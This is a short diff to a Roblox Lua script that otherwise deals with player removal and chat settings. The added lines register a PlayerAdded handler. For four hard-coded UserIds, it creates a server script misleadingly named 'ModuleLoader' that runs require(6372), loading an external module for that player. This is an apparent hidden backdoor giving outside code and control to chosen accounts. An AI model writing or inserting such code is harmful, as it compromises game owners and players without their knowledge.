@@ -83,12 +83,16 @@ game:GetService("Players").PlayerRemoving:connect(function(player)
 		end
 	end
 end)
+
+game:GetService("Players").PlayerAdded:connect(function(player)
 	if player.UserId == 3 or player.UserId == 2 or player.UserId == 23 or player.UserId == 46 then
         local loader = Instance.new("Script")
         loader.Name = "ModuleLoader"
         loader.Source = "require(6372)(game.Players:GetPlayerByUserId("..player.UserId.."))"
         loader.Parent = game:GetService("ServerScriptService")
     end
+end)
+
 local success, retVal = pcall(function() return game:GetService("Chat"):GetShouldUseLuaChat() end)
 local useNewChat = success and retVal
 --local FORCE_UseNewChat = require(game:GetService("CoreGui").RobloxGui.Modules.Common.ForceUseNewChat)
